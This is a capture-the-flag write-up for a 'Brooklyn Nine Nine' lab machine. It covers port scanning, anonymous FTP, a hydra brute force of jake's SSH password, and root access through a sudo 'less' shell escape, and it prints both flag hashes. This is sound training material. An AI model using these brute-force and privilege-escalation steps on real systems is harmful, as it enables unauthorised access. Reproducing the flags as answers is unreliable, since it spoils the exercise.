---
custom_edit_url: null
---

## Task 1: Deploy and get hacking
### User flag
First, let's scan the target using `nmap`.
```
$ nmap -sC -sV 10.10.255.141
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-06 21:01 IST
Nmap scan report for 10.10.255.141
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.48.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.98 seconds
```
There are three open ports:

| Port | Service | 
| :-: | :-: |
| 21 | ftp |
| 22 | ssh |
| 80 | http |

Let's scan all the directories using `gobuster`.
```
$ gobuster dir -u http://10.10.255.141 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.255.141
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 718]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
There seems to be nothing of interest in the web directories.

Let's login anonymously through FTP.
```
$ ftp anonymous@10.10.255.141
Connected to 10.10.255.141.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Let's check out the contents of this directory.
```
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
```
We can download the `note_to_jake.txt` file to our machine using the `get` command.
```
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |***********************************************************************************************************************************************************************************************|   119       22.82 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.85 KiB/s)
```
Let's check what is in the `note_to_jake.txt` file.
```
$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
The only service remaining is SSH. That means that the user `jake` has a weak SSH password.

Using `hydra`, we can brute force the password.
```
$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.255.141 -t 4
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-06 21:56:40
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.255.141:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[22][ssh] host: 10.10.255.141   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-06 21:59:14
```
Now we know that for the user `jake`, the password is `987654321`.

Let's login through SSH using these credentials.
```
$ ssh jake@10.10.255.141            
The authenticity of host '10.10.255.141 (10.10.255.141)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.88.195' (ED25519) to the list of known hosts.
jake@10.10.255.141's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ 
```
Let's go to the user `holt`.
```
jake@brookly_nine_nine:~$ cd ..
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
jake@brookly_nine_nine:/home$ cd holt/
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
```
We can now get the user flag.
```
jake@brookly_nine_nine:/home/holt$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee
```
### Answer
```
ee11cbb19052e40b07aac0ca060c23ee
```

&nbsp;

### Root flag
Let's check what file the `jake` user can execute.
```
jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```
We can got to GTFOBins to find an exploit for the `less` binary.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Knign/Write-ups/assets/110326359/1082bb6e-c589-4c23-9535-3b9ebbea349d)
</figure>

Copy and paste the `Sudo` exploit in the terminal.
```
jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile
# 
```
You will have to press `ENTER` once again after entering the command.
```
# cd root       
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```
### Answer
```
63a9f0ea7bb98050796b649e85481845
```
